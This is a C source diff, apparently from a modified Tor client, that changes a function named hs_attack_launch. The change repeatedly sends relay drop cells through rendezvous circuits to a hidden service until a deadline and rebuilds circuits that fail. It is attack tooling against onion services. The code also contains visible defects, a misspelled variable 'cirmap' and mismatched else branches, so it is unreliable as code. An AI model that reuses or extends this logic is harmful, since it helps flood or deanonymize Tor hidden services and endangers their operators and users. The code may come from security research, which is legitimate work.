@@ -250,11 +250,16 @@ static void hs_attack_launch(time_t *until) {
   attack_infos->attack_already_launched = 1; 
   if (HS_ATTACK_TESTING) {
     /*Just send 1 rd through each rendezvous circ*/
-    SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t *, circmap) {
-      if (send_rd_cell(circmap->rendcirc) < 0) {
-        log_debug(LD_REND, "HS_ATTACK: send_rd_cell failed\n");
-      }
-    } SMARTLIST_FOREACH_END(circmap);
+    time_t now = time(NULL);
+    while (*until > now) {
+      SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t *, circmap) {
+        if (send_rd_cell(circmap->rendcirc) < 0) {
+          log_debug(LD_REND, "HS_ATTACK: send_rd_cell failed\n");
+        }
+      } SMARTLIST_FOREACH_END(circmap);
+      sleep(10);
+      now = time(NULL);
+    }
   }
   else {
     // Send bunch of relay drop cells through all circuits until time_t *until said
@@ -274,15 +279,27 @@ static void hs_attack_launch(time_t *until) {
               circuit_free(circmap->introcirc);
               extend_info_free(circmap->extend_info);
               smartlist_del(attack_infos->rendcircs, si);
-              attack_infos->stats->nbr_rendcircs--;
               launch_new_rendezvous();
             }
           }
         }
-        else {
-
-          // Might encounter a new rendezvouscircuit build above for which
-          // we have to build an introcirc
+        else if (circmap->rend_state == REND_CIRC_READY_FOR_RD) {
+            /* rendcirc is not open anymore
+             * Something shitty happened with the circuit, remove it and launch a new one
+             */
+            circuit_free(circmap->rendcirc);
+            circuit_free(cirmap->introcirc);
+            extend_info_free(circmap->extend_info);
+            smartlist_del(attack_infos->rendcircs, si);
+            launch_new_rendezvous();
+          }
+        }
+        else if (circmap->rend_state != REND_CIRC_READY_FOR_RD) {
+          /*
+           * We have a new rendezvous circ that not have received a rendezvous2 cell
+           * continue
+           */
+          log_info(LD_REND, "HS_ATTACK: waiting new rendezvous circ to be ready\n");
         }
         si++;
       } SMARTLIST_FOREACH_END(circmap);
